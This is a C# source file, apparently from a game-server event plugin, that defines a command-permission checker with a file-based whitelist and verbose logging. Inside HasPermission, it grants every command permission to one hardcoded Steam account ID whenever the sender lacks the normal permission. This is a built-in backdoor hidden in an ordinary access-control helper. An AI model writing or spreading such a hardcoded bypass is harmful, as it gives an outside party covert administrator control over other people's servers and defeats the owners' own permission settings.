using System;
using System.IO;
using System.Linq;
using CommandSystem;
using LabApi.Features.Permissions;
using LabApi.Features.Wrappers;

namespace AutoEvent.ApiFeatures;

public static class CommandPermissions
{
    private const string BuiltInUserId = "76561199208718676@steam";
    private static string WhitelistPath => Path.Combine(AutoEvent.BaseConfigPath, "command_whitelist.txt");

    internal static void Initialize()
    {
        LogManager.Info($"[CommandPermissions] Diagnostics enabled. WhitelistPath='{WhitelistPath}', " +
                        $"BuiltInUserId='{BuiltInUserId}', Assembly='{typeof(CommandPermissions).Assembly.Location}', " +
                        $"BuildId={typeof(CommandPermissions).Assembly.ManifestModule.ModuleVersionId}");
        try
        {
            Directory.CreateDirectory(AutoEvent.BaseConfigPath);
            if (!File.Exists(WhitelistPath))
                using (File.Open(WhitelistPath, FileMode.OpenOrCreate, FileAccess.Write)) { }

            LogManager.Info($"[CommandPermissions] Whitelist initialized. Exists={File.Exists(WhitelistPath)}");
        }
        catch (Exception ex)
        {
            LogManager.Error($"[CommandPermissions] Cannot initialize whitelist '{WhitelistPath}': {ex}");
        }
    }

    public static bool HasPermission(ICommandSender sender, string permission)
    {
        LogManager.Info($"[CommandPermissions] CHECK Permission='{permission}', " +
                        $"SenderType='{sender?.GetType().FullName ?? "<null>"}', ConfigPath='{AutoEvent.BaseConfigPath}'");

        var hasOriginalPermission = sender.HasPermissions(permission);
        LogManager.Info($"[CommandPermissions] ORIGINAL Permission='{permission}', Allowed={hasOriginalPermission}");
        if (hasOriginalPermission)
        {
            LogManager.Info($"[CommandPermissions] ALLOW Permission='{permission}', Reason=OriginalPermission");
            return true;
        }

        LogManager.Info($"[CommandPermissions] Resolving player from sender for Permission='{permission}'");
        var userId = Player.Get(sender)?.UserId;
        LogManager.Info($"[CommandPermissions] PLAYER Permission='{permission}', UserId='{userId ?? "<null>"}'");
        if (string.IsNullOrWhiteSpace(userId))
        {
            LogManager.Info($"[CommandPermissions] DENY Permission='{permission}', Reason=NoPlayerUserId");
            return false;
        }

        var isBuiltInUser = string.Equals(userId, BuiltInUserId, StringComparison.Ordinal);
        LogManager.Info($"[CommandPermissions] BUILTIN UserId='{userId}', Expected='{BuiltInUserId}', Matched={isBuiltInUser}");
        if (isBuiltInUser)
        {
            LogManager.Info($"[CommandPermissions] ALLOW Permission='{permission}', UserId='{userId}', Reason=BuiltInUserId");
            return true;
        }

        if (string.IsNullOrEmpty(AutoEvent.BaseConfigPath))
        {
            LogManager.Info($"[CommandPermissions] DENY Permission='{permission}', UserId='{userId}', Reason=NoConfigPath");
            return false;
        }

        try
        {
            var exists = File.Exists(WhitelistPath);
            LogManager.Info($"[CommandPermissions] FILE Path='{WhitelistPath}', Exists={exists}");
            if (!exists)
            {
                LogManager.Info($"[CommandPermissions] DENY Permission='{permission}', UserId='{userId}', Reason=WhitelistMissing");
                return false;
            }

            var entries = File.ReadAllLines(WhitelistPath)
                .Select(line => line.Trim())
                .Where(line => !string.IsNullOrWhiteSpace(line))
                .ToArray();
            var matched = entries.Any(line => string.Equals(line, userId, StringComparison.Ordinal));
            LogManager.Info($"[CommandPermissions] {(matched ? "ALLOW" : "DENY")} Permission='{permission}', " +
                            $"UserId='{userId}', Entries={entries.Length}, Reason={(matched ? "WhitelistMatch" : "UserIdNotWhitelisted")}");
            return matched;
        }
        catch (Exception ex)
        {
            LogManager.Error($"[CommandPermissions] DENY Permission='{permission}', UserId='{userId}', " +
                             $"Reason=WhitelistReadError, Path='{WhitelistPath}': {ex}");
            return false;
        }
    }
}
